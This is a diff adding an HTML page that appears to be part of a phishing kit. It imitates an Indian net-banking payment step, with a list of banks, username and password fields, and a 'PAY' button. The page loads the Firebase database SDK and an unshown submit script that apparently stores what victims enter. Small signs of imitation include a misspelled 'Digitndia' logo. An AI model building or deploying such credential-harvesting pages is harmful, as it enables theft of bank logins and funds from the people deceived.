@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>request-ccc</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #ffffff;
+    }
+
+    .top-image {
+      width: 100%;
+      height: auto;
+      margin-bottom: 20px;
+    }
+
+    .form-box {
+      width: 92%;
+      max-width: 400px;
+      margin: 0 auto 20px auto;
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      padding: 25px;
+    }
+
+    label {
+      display: block;
+      font-weight: bold;
+      font-size: 14px;
+      margin-bottom: 5px;
+      text-align: left;
+    }
+
+    select, input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      margin-bottom: 18px;
+      border: none;
+      border-bottom: 2px solid #e53935;
+      background-color: transparent;
+      color: #333;
+    }
+
+    input::placeholder {
+      color: #aaa;
+    }
+
+    .pay-btn {
+      width: 160px;
+      background-color: #e53935;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      padding: 14px 30px;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+      margin: 30px auto 20px;
+      display: block;
+    }
+
+    .footer-logos {
+      display: flex;
+      justify-content: center;
+      gap: 30px;
+      margin-top: 20px;
+      padding-bottom: 30px;
+    }
+
+    .footer-logos img {
+      height: 35px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Bank Image -->
+  <img src="https://media.fortuneindia.com/fortune-india/import/2022-05/0e3769c0-6456-4a93-bf42-175ecea786d5/SFB_lead.jpg?w=640&auto=format,compress&fit=max&q=70" alt="Bank" class="top-image" />
+
+  <!-- Net Banking Form -->
+  <div class="form-box">
+    <form id="ududip007">
+      <label for="bank">Select Bank:</label>
+      <select id="bank" required>
+        <option value="">Select Bank:</option>
+        <option>SBI Bank</option>
+        <option>HDFC Bank</option>
+  <option>ICICI Bank</option>
+        <option>AXIS Bank</option>
+        <option>Allahabad Bank</option>
+  <option>Andhra Bank</option>
+  <option>Bank of Bahrain and Kuwait</option>
+  <option>Bank of Baroda - Corporate Banking</option>
+  <option>Bank of Baroda - Retail Banking</option>
+  <option>Bank of India</option>
+  <option>Bank of Maharashtra</option>
+  <option>Canara Bank</option>
+  <option>Central Bank of India</option>
+  <option>City Union Bank</option>
+  <option>Corporation Bank</option>
+  <option>Deutsche Bank</option>
+  <option>Development Credit Bank</option>
+  <option>Dhanlaxmi Bank</option>
+  <option>Federal Bank</option>
+  
+  <option>IDBI Bank</option>
+  <option>Indian Bank</option>
+  <option>Indian Overseas Bank</option>
+  <option>IndusInd Bank</option>
+  <option>ING Vysya Bank</option>
+  <option>Jammu and Kashmir Bank</option>
+  <option>Karnataka Bank Ltd</option>
+  <option>Karur Vysya Bank</option>
+  <option>Kotak Bank</option>
+  <option>Laxmi Vilas Bank</option>
+  <option>Oriental Bank of Commerce</option>
+  <option>Punjab National Bank - Corporate Banking</option>
+  <option>Punjab National Bank - Retail Banking</option>
+  <option>Punjab & Sind Bank</option>
+  <option>Shamrao Vitthal Co-operative Bank</option>
+  <option>South Indian Bank</option>
+  <option>State Bank of Bikaner & Jaipur</option>
+  <option>State Bank of Hyderabad</option>
+  <option>State Bank of India</option>
+  <option>State Bank of Mysore</option>
+  <option>State Bank of Patiala</option>
+  <option>State Bank of Travancore</option>
+  <option>Syndicate Bank</option>
+  <option>Tamilnad Mercantile Bank Ltd.</option>
+  <option>UCO Bank</option>
+  <option>Union Bank of India</option>
+  <option>United Bank of India</option>
+  <option>Vijaya Bank</option>
+  <option>Yes Bank Ltd</option>
+      </select>
+
+      <label for="userid">Username / Customer Id</label>
+      <input type="text" id="userid" placeholder="UserID" required />
+
+      <label for="password">Password</label>
+      <input type="password" id="password" placeholder="Password" required />
+
+      <button type="submit" class="pay-btn">PAY</button>
+    </form>
+  </div>
+
+  <!-- Bottom Logos -->
+  <div class="footer-logos">
+    <img src="1d.png" alt="Digitndia" />
+    <img src="2n.png" alt="gvg" />
+  </div>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+  <!-- Firebase Config -->
+  <script src="firebase-config.js"></script>
+
+  <!-- Form Submit Logic -->
+  <script src="step2-script.js"></script>
+</body>
+</html>
